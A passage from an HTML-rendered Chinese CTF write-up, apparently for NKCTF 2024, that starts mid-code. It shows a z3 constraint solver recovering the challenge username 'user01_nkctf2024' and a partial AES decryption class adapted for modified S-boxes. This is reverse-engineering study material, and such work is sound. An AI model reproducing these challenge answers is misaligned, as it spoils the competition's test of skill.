operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">123</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">222</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">113427</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">444</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">54166</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">56</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">121</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">11130</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">169</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">158</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">98</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">27382</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">147</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">131</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">129</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">23564</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">137</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">132</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">620</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">135</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">51206</span><span class="token punctuation">)</span><span class="token comment"># 检查是否存在解</span><span class="token keyword">if</span> solver<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat<span class="token punctuation">:</span>    model <span class="token operator">=</span> solver<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 输出解</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"a1[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">] = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>model<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No solution"</span><span class="token punctuation">)</span><span class="token comment">#输出username</span>a1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">]</span>username<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token comment">#user01_nkctf2024</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>网上找了个标准AES脚本修改了下，应该可以通杀魔改sbox的题</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># http://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf</span><span class="token keyword">class</span> <span class="token class-name">IAES</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> new_s_box    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>Nk <span class="token operator">=</span> <span class="token number">4</span>        self<span class="token punctuation">.</span>Nb <span class="token operator">=</span> <span class="token number">4</span>        self<span class="token punctuation">.</span>Nr <span class="token operator">=</span> <span class="token number">10</span>    <span class="token keyword">def</span> <span class="token function">arrays</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        Nb <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            Nb <span class="token operator">=</span> Nb <span class="token operator">+</span> <span class="token punctuation">[</span>raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">0</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">1</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> Nb    <span class="token keyword">def</span> <span class="token function">Inv_arrays</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        Inv_raws <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            Inv_raws <span class="token operator">=</span> Inv_raws <span class="token operator">+</span> <span class="token punctuation">[</span>raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">0</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">1</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> Inv_raws    <span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        raws <span class="token operator">=</span> self<span class="token punctuation">.</span>Inv_arrays<span class="token punctuation">(</span>raws<span class="token punctuation">)</span>        raws <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> raws<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>raws<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">view2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'2x'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> i <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>  <span class="token comment"># i%4 == 3</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">AddRoundKey</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">,</span> Keys<span class="token punctuation">)</span><span class="token punctuation">:</span>        AddRoundKey <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> raw<span class="token punctuation">,</span> Key <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>raws<span class="token punctuation">,</span> Keys<span class="token punctuation">)</span><span class="token punctuation">:</span>            AddRoundKey<span class="token punctuation">.</span>append<span class="token punctuation">(</span>raw <span class="token operator">^</span> Key<span class="token punctuation">)</span>        <span class="token keyword">return</span> AddRoundKey    <span class="token keyword">def</span> <span class="token function">SubBytes</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        S_box<span class="token operator">=</span>new_s_box        raws_S_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> raw <span class="token keyword">in</span> raws<span class="token punctuation">:</span>            raws_S_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>S_box<span class="token punctuation">[</span>raw<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> raws_S_box    <span class="token keyword">def</span> <span class="token function">InvSubBytes</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">,</span>inv_s_box<span class="token punctuation">)</span><span class="token punctuation">:</span>        IS_box <span class="token operator">=</span> inv_s_box        raws_IS_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> raw <span class="token keyword">in</span> raws<span class="token punctuation">:</span>            raws_IS_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>IS_box<span class="token punctuation">[</span>raw<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> raws_IS_box    <span class="token keyword">def</span> <span class="token function">InvShiftRows</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        s13 <span class="token operator">=</span> raws<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>        raws<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> s13<span class="token punctuation">)</span>        s2223 <span class="token operator">=</span> raws<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>        <span class="token keyword">del</span> raws<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>        raws<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> s2223        s313233 <span class="token operator">=</span> raws<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>        <span class="token keyword">del</span> raws<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>        raws<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> s313233        <span class="token keyword">return</span> raws    <span class="token keyword">def</span> <span class="token function">GMUL</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Russian Peasant Multiplication algorithm</span>        p <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> a <span class="token keyword">and</span> b<span class="token punctuation">:</span>            <span class="token keyword">if</span> b <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># b%2</span>                p <span class="token operator">=</span> p <span class="token operator">^</span> a            <span class="token keyword">if</span> a <span class="token operator">&amp;</span> <span class="token number">0x80</span><span class="token punctuation">:</span>  <span class="token comment"># a=a*x^7(a>0),a >= 2**7(128)</span>                a <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x11b</span>  <span class="token comment"># 0x11b = x^8 + x^4 + x^3 + x + 1 (0b100011011)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                a <span class="token operator">=</span> a <span class="token operator">&lt;&lt;</span> <span class="token number">1</span>            b <span class="token operator">=</span> b <span class="token operator">>></span> <span class="token number">1</span>        <span class="token keyword">return</span> p    <span class="token keyword">def</span> <span class="token function">InvMixColumns</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raws<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            raws<span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> \                raws<span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> \                raws<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> \                raws<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span> \                <span class="token operator">=</span> \                self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0e</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0b</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span>                    <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \                self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0e</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0b</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span>                    <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \                self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0e</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span>                    <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0b</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \                self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0b</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span>                    <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0e</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> raws    <span class="token keyword">def</span> <span class="token function">RotWord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">:</span>        b0 <span class="token operator">=</span> temp<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        temp<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> b0<span class="token punctuation">)</span>        <span class="token keyword">return</span> temp    <span class="token keyword">def</span> <span class="token function">SubWord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> self<span class="token punctuation">.</span>SubBytes<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>        <span class="token keyword">return</span> temp    <span class="token keyword">def</span> <span class="token function">KeyExpansion</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token number">0</span>        w <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>Nb <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>Nr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        Rcon <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>                <span class="token punctuation">]</span>        <span class="token keyword">while</span> i <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>Nk<span class="token punctuation">:</span>            w<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>        i <span class="token operator">=</span> self<span class="token punctuation">.</span>Nk        <span class="token keyword">while</span> i <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>Nb <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>Nr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp <span class="token operator">=</span> w<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> i <span class="token operator">%</span> self<span class="token punctuation">.</span>Nk <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                temp <span class="token operator">=</span> self<span class="token punctuation">.</span>SubWord<span class="token punctuation">(</span>self<span class="token punctuation">.</span>RotWord<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span>                temp2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token keyword">for</span> temp1<span class="token punctuation">,</span> Rcon1 <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> Rcon<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">//</span> 